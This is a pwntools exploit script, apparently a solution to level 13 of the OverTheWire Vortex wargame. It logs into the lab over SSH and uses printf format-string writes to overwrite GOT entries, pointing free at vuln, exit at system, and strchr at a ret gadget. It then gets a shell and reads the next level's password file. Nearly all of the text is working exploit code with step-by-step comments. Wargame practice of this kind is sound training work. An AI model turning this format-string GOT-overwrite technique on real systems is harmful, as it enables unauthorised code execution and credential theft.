#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn   import *
context(arch='i386',os='linux')

level    = 13
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(chal):
    shell.download_file(binary)
    os.chmod(chal, 0755)

# !!!
# Caveat: I watched geohot's stream for this one.
#
# That said, I'm solving it differently, none of this "magic offset" BS.
# !!!

#
# Step 0:
#
# Be able to execute the program with argc==0
#
# Inconveniently, this also "appears" to break debugging
# on the remote machine.  Lots of warnings and errors.
# However, it still works fine if you hit "continue".
#
with file('noarg.py','w+') as noarg:
    noarg.write("""
import os, sys
os.execve(sys.argv[1],[],{})
""")

shell.set_working_directory()
shell.upload_file('noarg.py')

#
# Step 1:
#
# Be able to enter input multiple times.
#
# In order to do this, overwrite the GOT pointer for 'free'
# with the address of 'vuln'.
#
# Since 'free' is the only GOT entry that's invoked after
# printf, I don't think this is 'cheating' to use the same
# approach as Hotz.  I think it's the only approach.
#


#
# Step 1A:
#
# Find the name of the program on the stack.
#
# To do this, we will create a symlink to the target binary
# with a large cyclic name, and search for the pattern on
# the stack.
#
symlink = cyclic(0x20)
offset  = -1
shell.ln(['-s',binary, symlink])



# Params of (110,120) chosen after letting it run (0,500) once.
# This is just quicker since I'm running it multiple times to dev.
for index in range(110,120):
    with shell.run('python noarg.py ./%s' % symlink) as ch:
        ch.sendline('%{}$X'.format(index))
        response = ch.recvline().strip()
        try:
            data = unhex(response)
            assert len(data) == 4
        except Exception:
            continue

        offset = cyclic_find(data[::-1])
        if 0 <= offset and offset < 0x100:
            break

log.info("Found binary name on stack in argument %i at offset %i" % (index, offset))

#
# Step 1B
#
# Put the addresses that we want to patch in the name
# of the symlink, and reference them as arguments from
# print.
#
elf = ELF(chal)

indexes   = {}
addresses = ''

# Put a fake entry in the ELF's got table to make this next loop nicer
elf.got['exit_hi'] = elf.got['exit']+2

for name in ('exit','exit_hi','free','strchr'):
    addr          = elf.got[name]
    indexes[name] = index
    addresses     += p32(addr)
    index         += 1

    log.info("%#x got.%s @ %i" % (addr, name, index))

symlink = symlink[:offset] + addresses + symlink[offset + len(addresses):]

log.info("Symlink data\n%s" % hexdump(symlink))
shell.ln(['-s', binary, symlink])

#
# Ensure that we get the correct values when we read it back
#
for name in indexes.keys():
    log.info("Verifying %r..." % name)
    with shell.run('python noarg.py $%r' % symlink) as ch:
        ch.sendline('%{}$X'.format(indexes[name]))
        resp = ch.recvline().strip()
        assert eval('0x' + resp) == elf.got[name]

#
# Step 1C
#
# By default, the addresses in the .got point to their corresponding
# entires in the .plt.  The .plt entries are in the vortex13 binary,
# so the first two bytes of the address should be the same as any
# other address in the binary.
#
# This works because the printf format code "%hn" only writes the
# low two bytes (word), and doesn't zero out the upper two bytes.
#
vuln  = elf.symbols['vuln']
free  = elf.plt['free']
assert (free & 0xffff0000) == (vuln & 0xffff0000)

fmt = '%{}d%{}$hn'.format(vuln & 0xffff, indexes['free'])
log.info("Format for got.free=>vuln: %r" % fmt)

ch = shell.run('python noarg.py ./$%r' % symlink)
ch.sendline(fmt)


#
# Step 2
#
# In a few writes...
#
# - Overwrite 'got.exit' with 'system' in two writes
# - Make 'strchr' always return 1 by pointing it at a 'retn' gadget in libc
# - One final write, re-overwrite the address of 'got.free' with 'plt.exit'
#   which will invoke 'got.exit', which is now 'system' due to the nuked pointer.
#

#
# N.B. After the first format string, the entire stack shifts
#      because we are recursing into vuln().  Because of this,
#      or indexes must shift.
#
shift = 12


#
# Step 2A
#
# got.exit ==> system
#
# If exit() is invoked, it'll call system.
#
libs = gdb.find_module_addresses(binary, ssh=shell)
libc = next(l for l in libs if 'libc' in l.path)

system    = libc.symbols['system']
plt_exit  = elf.plt['exit']
log.info("%#x plt.exit" % plt_exit)
log.info("%#x system" % system)

fmt = '%{}d%{}$hn'.format(system & 0xffff, indexes['exit'] + shift)
log.info("Format for got.exit=>system 1/2: %r" % fmt)
ch.sendline(fmt)

fmt = '%{}d%{}$hn'.format((system>>16) & 0xffff, indexes['exit_hi'] + (2*shift))
log.info("Format for got.exit=>system 2/2: %r" % fmt)
ch.sendline(fmt)

#
# Step 2B
#
# Make strchr() always return success.  This is easy since 'eax' is set
# to a nonzero value just before the call.  We only need *any* retn.
#
# This is necessary because we need a semicolon in our system() line,
# which is not in the allowed characters.
#
# Unfortunately, we can't use elf.symbols[...] for strchr, because the
# one inserted into the GOT is not the same as the exported routine.
# I assume this is because the one returned is more optimized, and
# returned during the GOT linking stage.  IDA doesn't show any x-refs
# to the routine, or any symbol information for it.
#

with shell.run('gdb %r' % binary) as gdb:
    gdb.send('''
    set prompt
    break *main
    run
    set {void*}($sp+4)=getenv("PATH")
    set {void*}($sp+8)=0
    set $pc=%#x
    finish
    ''' % elf.plt['strchr'])
    gdb.clean(2)
    gdb.sendline('printf "%%#x\\n",*%#x' % elf.got['strchr'])
    strchr = eval(gdb.recvline())

# Find any 'ret' gadget that has the same hiword as strchr
# The easiest way to do this is to just search for a ret.
retn      = strchr
while libc.read(retn, 1) != '\xc3':
    retn += 1

log.info("%#x strchr" % strchr)
log.info("%#x strchr (as exported)" % libc.symbols['strchr'])
log.info("%#x ret" % retn)
assert strchr & 0xffff0000 == retn & 0xffff0000


fmt = '%{}d%{}$hn'.format(retn & 0xffff, indexes['strchr'] + (3*shift))
log.info("Format for strchr=>retn: %r" % fmt)
ch.sendline(fmt)


#
# Step 2C
#
# got.free ==> plt.exit ==> got.exit ==> system
#
fmt = 'sh;' + '%{}d%{}$hn'.format((plt_exit & 0xffff) - len('sh;'), indexes['free'] + (4*shift))
log.info("Format for got.free=>plt.exit: %r" % fmt)
ch.sendline(fmt)


#
# Win
#
ch.clean(2)
ch.sendline('id')
log.success('id: ' + ch.recvline().strip())

ch.sendline('cat %s' % passfile)
password = ch.recvline().strip()
log.success('Password: %s' % password)

print password
